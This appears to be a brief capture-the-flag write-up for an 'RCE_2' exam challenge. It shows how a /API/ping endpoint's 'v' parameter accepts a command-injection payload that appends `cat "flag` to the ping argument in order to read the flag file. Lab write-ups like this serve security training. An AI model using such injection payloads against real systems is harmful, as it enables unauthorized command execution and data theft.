# RCE_2 - store.xIiP317O4G9CYruarTS1ag.exam.ns.agency (/API/ping)

After visitng the robots.txt file and visiting the `/API/ping` directory to discover the `v` parameter. If one were to visit `/API/ping?v=1.1.1.1` they would receive the following output.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CDBDAD1A1E89CCC50B184DFCDFAA97E7399DB0AA30A1DBB2365E916F0CCC6B11_1528381097611_Screen+Shot+2018-06-07+at+11.49.13+pm.png)


The same way as rce_1, visiting the URL `/API/ping?v=1.1.1.1";cat "flag` will release the flag.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CDBDAD1A1E89CCC50B184DFCDFAA97E7399DB0AA30A1DBB2365E916F0CCC6B11_1528381111789_Screen+Shot+2018-06-07+at+11.49.27+pm.png)
